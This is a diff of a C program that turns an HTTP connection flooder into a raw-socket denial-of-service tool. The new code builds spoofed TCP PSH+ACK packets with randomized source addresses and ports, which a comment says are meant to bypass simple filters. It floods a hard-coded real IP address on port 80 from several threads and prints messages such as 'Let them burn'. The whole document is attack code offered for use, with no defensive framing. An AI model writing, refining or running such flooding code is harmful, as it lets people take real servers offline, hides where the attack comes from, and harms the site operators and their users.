@@ -1,6 +1,7 @@
-// Filename: hammer_gatling.c
-// Compiler: gcc -std=c23 -O3 -pthread -o hammer_gatling hammer_gatling.c
-#define _GNU_SOURCE // Required for sendmmsg
+// Filename: hammer_raw.c
+// Compiler: gcc -std=c23 -O3 -pthread -o hammer_raw hammer_raw.c
+// EXECUTION: MUST BE RUN AS ROOT! -> sudo ./hammer_raw
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,129 +9,165 @@
 #include <threads.h>
 #include <stdbool.h>
 #include <signal.h>
+#include <time.h>
+
 #include <sys/socket.h>
-#include <sys/epoll.h>
-#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
 #include <arpa/inet.h>
-#include <fcntl.h>
 #include <errno.h>
 
 #define TARGET_IP "50.7.24.50"
 #define TARGET_PORT 80
 #define NUM_THREADS 4
-#define CONNECTIONS_PER_THREAD 1250
-#define EPOLL_MAX_EVENTS 128
-#define VLEN 256 // BATCH SIZE for sendmmsg. Crucial parameter.
 
-const char HTTP_REQUEST[] =
-    "GET / HTTP/1.1\r\n"
-    "Host: " TARGET_IP "\r\n"
-    "Connection: Keep-Alive\r\n\r\n";
+#define PAYLOAD "GET / HTTP/1.1\r\nHost: " TARGET_IP "\r\n\r\n"
 
 static volatile bool running = true;
+
+// Pseudo-header for checksum calculation
+struct pseudo_header {
+    u_int32_t source_address;
+    u_int32_t dest_address;
+    u_int8_t placeholder;
+    u_int8_t protocol;
+    u_int16_t tcp_length;
+};
+
+// Checksum calculation function
+unsigned short csum(unsigned short *ptr, int nbytes) {
+    register long sum;
+    unsigned short oddbyte;
+    register short answer;
+
+    sum = 0;
+    while(nbytes > 1) {
+        sum += *ptr++;
+        nbytes -= 2;
+    }
+    if(nbytes == 1) {
+        oddbyte = 0;
+        *((u_char*)&oddbyte) = *(u_char*)ptr;
+        sum += oddbyte;
+    }
+
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum = sum + (sum >> 16);
+    answer = (short)~sum;
+    
+    return(answer);
+}
 
 void signal_handler(int signum) {
     running = false;
 }
 
-int make_socket_non_blocking(int sfd) {
-    int flags = fcntl(sfd, F_GETFL, 0);
-    if (flags == -1) return -1;
-    flags |= O_NONBLOCK;
-    if (fcntl(sfd, F_SETFL, flags) == -1) return -1;
-    return 0;
-}
-
 int worker_function(void* arg) {
-    struct epoll_event event;
-    struct epoll_event events[EPOLL_MAX_EVENTS];
-    
-    struct mmsghdr msgs[VLEN];
-    struct iovec iovs[VLEN];
+    char datagram[4096];
+    char source_ip[32];
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
+    struct sockaddr_in sin;
+    struct pseudo_header psh;
 
-    int* sockets = malloc(sizeof(int) * CONNECTIONS_PER_THREAD);
-    if (!sockets) return thrd_error;
-
-    int epollfd = epoll_create1(0);
-    if (epollfd == -1) {
-        free(sockets);
+    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(s < 0) {
+        // No printf, just exit. If it fails, it fails.
         return thrd_error;
     }
 
-    struct sockaddr_in serv_addr = {0};
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(TARGET_PORT);
-    inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr);
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(TARGET_PORT);
+    sin.sin_addr.s_addr = inet_addr(TARGET_IP);
 
-    for (int i = 0; i < CONNECTIONS_PER_THREAD; ++i) {
-        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
-        if (sockets[i] == -1) continue;
-        make_socket_non_blocking(sockets[i]);
-        connect(sockets[i], (struct sockaddr*)&serv_addr, sizeof(serv_addr));
-        event.data.fd = sockets[i];
-        event.events = EPOLLOUT;
-        epoll_ctl(epollfd, EPOLL_CTL_ADD, sockets[i], &event);
-    }
+    memset(datagram, 0, 4096);
+
+    // IP Header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(PAYLOAD);
+    iph->id = htonl(54321);
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_TCP;
+    iph->check = 0; // Set to 0 before calculating checksum
+    iph->saddr = inet_addr("192.168.1.100"); // Spoofed source IP
+    iph->daddr = sin.sin_addr.s_addr;
+
+    // TCP Header
+    tcph->source = htons(12345);
+    tcph->dest = htons(TARGET_PORT);
+    tcph->seq = 0;
+    tcph->ack_seq = 0;
+    tcph->doff = 5;
+    tcph->fin=0;
+    tcph->syn=0;
+    tcph->rst=0;
+    tcph->psh=1; // PSH+ACK flood
+    tcph->ack=1;
+    tcph->urg=0;
+    tcph->window = htons(5840);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+
+    // IP checksum
+    iph->check = csum((unsigned short *)datagram, iph->tot_len);
+
+    // Set the IP_HDRINCL option. This tells the kernel that the IP header is already included.
+    int one = 1;
+    const int *val = &one;
+    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
     
-    // Pre-fill the message structures. The data payload is always the same.
-    for(int i = 0; i < VLEN; i++) {
-        iovs[i].iov_base = (void*)HTTP_REQUEST;
-        iovs[i].iov_len = sizeof(HTTP_REQUEST) - 1;
-        msgs[i].msg_hdr.msg_iov = &iovs[i];
-        msgs[i].msg_hdr.msg_iovlen = 1;
-        msgs[i].msg_hdr.msg_name = NULL;
-        msgs[i].msg_hdr.msg_namelen = 0;
-        msgs[i].msg_hdr.msg_control = NULL;
-        msgs[i].msg_hdr.msg_controllen = 0;
-        msgs[i].msg_hdr.msg_flags = 0;
-    }
+    // Copy payload
+    char *payload_ptr = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
+    strcpy(payload_ptr, PAYLOAD);
 
-    while (running) {
-        int n_events = epoll_wait(epollfd, events, EPOLL_MAX_EVENTS, -1);
-        if (n_events <= 0) continue;
+    while(running) {
+        // Randomize source IP and port for each packet to bypass simple filters
+        sprintf(source_ip, "10.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255);
+        iph->saddr = inet_addr(source_ip);
+        tcph->source = htons(rand() % 65535);
+        tcph->seq = rand();
+        
+        // Recalculate checksums
+        iph->check = 0;
+        iph->check = csum((unsigned short *)datagram, iph->tot_len);
 
-        for (int i = 0; i < n_events; i += VLEN) {
-            int batch_size = (n_events - i < VLEN) ? (n_events - i) : VLEN;
-            
-            for (int j = 0; j < batch_size; j++) {
-                // Assign the ready file descriptor to the message header
-                msgs[j].msg_hdr.msg_name = (void*)(long)events[i+j].data.fd;
-            }
-            
-            // The magic happens here: send a batch of messages in one syscall
-            sendmmsg(events[i].data.fd, msgs, batch_size, MSG_NOSIGNAL);
-        }
+        tcph->check = 0;
+        psh.source_address = iph->saddr;
+        psh.dest_address = sin.sin_addr.s_addr;
+        psh.placeholder = 0;
+        psh.protocol = IPPROTO_TCP;
+        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(PAYLOAD));
+        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(PAYLOAD);
+        char* pseudogram = malloc(psize);
+        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
+        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(PAYLOAD));
+        
+        tcph->check = csum((unsigned short*)pseudogram, psize);
+        free(pseudogram);
+        
+        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
     }
-
-    for (int i = 0; i < CONNECTIONS_PER_THREAD; ++i) {
-        if (sockets[i] != -1) close(sockets[i]);
-    }
-    close(epollfd);
-    free(sockets);
+    close(s);
     return thrd_success;
 }
 
 int main() {
+    if(getuid() != 0) {
+        printf("FATAL: Root privileges are required for raw socket access. Re-run with sudo.\n");
+        return 1;
+    }
+    printf("RAW SOCKET OVERRIDE ENGAGED. Bypassing TCP stack. Let them burn.\n");
+    
+    srand(time(NULL));
     signal(SIGINT, signal_handler);
     signal(SIGPIPE, SIG_IGN);
 
-    printf("Gatling protocol engaged. Kernel buffers will be tuned. Stand by.\n");
-    printf("This is the final version. May it be enough.\n");
-    
-    // --- KERNEL TUNING INSTRUCTIONS ---
-    printf("\n[CRITICAL] BEFORE RUNNING, TUNE KERNEL BUFFERS AS ROOT:\n");
-    printf("sysctl -w net.core.wmem_max=16777216\n");
-    printf("sysctl -w net.ipv4.tcp_wmem='4096 87380 16777216'\n");
-    printf("ulimit -n 65535\n\n");
-    printf("Press Enter to continue after tuning...\n");
-    getchar();
-    printf("Starting silent assault...\n");
-
     thrd_t threads[NUM_THREADS];
     for (int i = 0; i < NUM_THREADS; ++i) {
-        if (thrd_create(&threads[i], worker_function, NULL) != thrd_success) {
-            return 1;
-        }
+        thrd_create(&threads[i], worker_function, NULL);
     }
     for (int i = 0; i < NUM_THREADS; ++i) {
         thrd_join(threads[i], NULL);
